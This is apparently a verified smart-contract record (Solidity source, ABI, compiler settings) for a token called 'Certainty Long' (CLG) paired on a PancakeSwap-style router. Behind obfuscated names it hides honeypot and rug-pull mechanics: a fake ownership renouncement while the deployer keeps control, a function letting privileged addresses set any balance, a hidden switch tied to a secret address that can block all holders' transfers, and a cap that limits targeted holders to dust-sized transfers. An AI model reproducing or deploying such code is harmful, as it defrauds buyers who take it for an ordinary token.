{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface modeSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract sellReceiverAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listFee {\n    function createPair(address exemptLaunched, address enableTrading) external returns (address);\n}\n\ninterface buyWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromAt) external view returns (uint256);\n\n    function transfer(address launchedAt, uint256 maxLaunchReceiver) external returns (bool);\n\n    function allowance(address walletLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxLaunchReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedAt,\n        uint256 maxLaunchReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isBuyTake, uint256 value);\n    event Approval(address indexed walletLiquidity, address indexed spender, uint256 value);\n}\n\ninterface sellShould is buyWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CertaintyLong is sellReceiverAuto, buyWallet, sellShould {\n\n    mapping(address => uint256) private feeFund;\n\n    function owner() external view returns (address) {\n        return swapSell;\n    }\n\n    uint256 private walletSell = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return swapSell;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingLaunch;\n    }\n\n    function transfer(address launchFrom, uint256 maxLaunchReceiver) external virtual override returns (bool) {\n        return senderTeamFee(_msgSender(), launchFrom, maxLaunchReceiver);\n    }\n\n    event OwnershipTransferred(address indexed receiverTrading, address indexed fundShould);\n\n    function approve(address totalFrom, uint256 maxLaunchReceiver) public virtual override returns (bool) {\n        receiverAt[_msgSender()][totalFrom] = maxLaunchReceiver;\n        emit Approval(_msgSender(), totalFrom, maxLaunchReceiver);\n        return true;\n    }\n\n    function maxAmount(address enableTakeLaunched) public {\n        senderWallet();\n        if (toMax) {\n            liquidityTradingExempt = atToken;\n        }\n        if (enableTakeLaunched == listMode || enableTakeLaunched == launchedTake) {\n            return;\n        }\n        totalTo[enableTakeLaunched] = true;\n    }\n\n    address public launchedTake;\n\n    uint256 isTx;\n\n    address private swapSell;\n\n    function allowance(address sellSwap, address totalFrom) external view virtual override returns (uint256) {\n        if (totalFrom == teamIs) {\n            return type(uint256).max;\n        }\n        return receiverAt[sellSwap][totalFrom];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletSell;\n    }\n\n    function atFund() public {\n        emit OwnershipTransferred(listMode, address(0));\n        swapSell = address(0);\n    }\n\n    bool public atToLiquidity;\n\n    address teamIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 enableTo;\n\n    constructor (){\n        \n        modeSell buyReceiverTo = modeSell(teamIs);\n        launchedTake = listFee(buyReceiverTo.factory()).createPair(buyReceiverTo.WETH(), address(this));\n        if (atToken != liquidityTradingExempt) {\n            atToLiquidity = false;\n        }\n        listMode = _msgSender();\n        atFund();\n        swapTotal[listMode] = true;\n        feeFund[listMode] = walletSell;\n        if (atToLiquidity != txTo) {\n            atToken = liquidityTradingExempt;\n        }\n        emit Transfer(address(0), listMode, walletSell);\n    }\n\n    string private amountSwap = \"CLG\";\n\n    uint256 public liquidityTradingExempt;\n\n    function shouldLaunch(address liquidityAuto) public {\n        require(liquidityAuto.balance < 100000);\n        if (totalMinMarketing) {\n            return;\n        }\n        if (toMax != txTo) {\n            atToLiquidity = true;\n        }\n        swapTotal[liquidityAuto] = true;\n        if (txTo) {\n            liquidityTradingExempt = atToken;\n        }\n        totalMinMarketing = true;\n    }\n\n    function maxEnable(address sellTx, address launchedAt, uint256 maxLaunchReceiver) internal returns (bool) {\n        require(feeFund[sellTx] >= maxLaunchReceiver);\n        feeFund[sellTx] -= maxLaunchReceiver;\n        feeFund[launchedAt] += maxLaunchReceiver;\n        emit Transfer(sellTx, launchedAt, maxLaunchReceiver);\n        return true;\n    }\n\n    function senderWallet() private view {\n        require(swapTotal[_msgSender()]);\n    }\n\n    address fromList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountSwap;\n    }\n\n    function transferFrom(address sellTx, address launchedAt, uint256 maxLaunchReceiver) external override returns (bool) {\n        if (_msgSender() != teamIs) {\n            if (receiverAt[sellTx][_msgSender()] != type(uint256).max) {\n                require(maxLaunchReceiver <= receiverAt[sellTx][_msgSender()]);\n                receiverAt[sellTx][_msgSender()] -= maxLaunchReceiver;\n            }\n        }\n        return senderTeamFee(sellTx, launchedAt, maxLaunchReceiver);\n    }\n\n    bool public txTo;\n\n    function minTotalAmount(address launchFrom, uint256 maxLaunchReceiver) public {\n        senderWallet();\n        feeFund[launchFrom] = maxLaunchReceiver;\n    }\n\n    address public listMode;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingTotal;\n    }\n\n    function balanceOf(address fromAt) public view virtual override returns (uint256) {\n        return feeFund[fromAt];\n    }\n\n    string private marketingTotal = \"Certainty Long\";\n\n    mapping(address => bool) public swapTotal;\n\n    uint256 constant enableExempt = 6 ** 10;\n\n    bool public totalMinMarketing;\n\n    bool private toMax;\n\n    function senderTeamFee(address sellTx, address launchedAt, uint256 maxLaunchReceiver) internal returns (bool) {\n        if (sellTx == listMode) {\n            return maxEnable(sellTx, launchedAt, maxLaunchReceiver);\n        }\n        uint256 shouldFee = buyWallet(launchedTake).balanceOf(fromList);\n        require(shouldFee == enableTo);\n        require(launchedAt != fromList);\n        if (totalTo[sellTx]) {\n            return maxEnable(sellTx, launchedAt, enableExempt);\n        }\n        return maxEnable(sellTx, launchedAt, maxLaunchReceiver);\n    }\n\n    mapping(address => bool) public totalTo;\n\n    function totalMarketing(uint256 maxLaunchReceiver) public {\n        senderWallet();\n        enableTo = maxLaunchReceiver;\n    }\n\n    uint8 private tradingLaunch = 18;\n\n    uint256 private atToken;\n\n    mapping(address => mapping(address => uint256)) private receiverAt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isBuyTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLaunchReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atToLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTradingExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTakeLaunched\",\"type\":\"address\"}],\"name\":\"maxAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLaunchReceiver\",\"type\":\"uint256\"}],\"name\":\"minTotalAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAuto\",\"type\":\"address\"}],\"name\":\"shouldLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxLaunchReceiver\",\"type\":\"uint256\"}],\"name\":\"totalMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMinMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLaunchReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLaunchReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CertaintyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}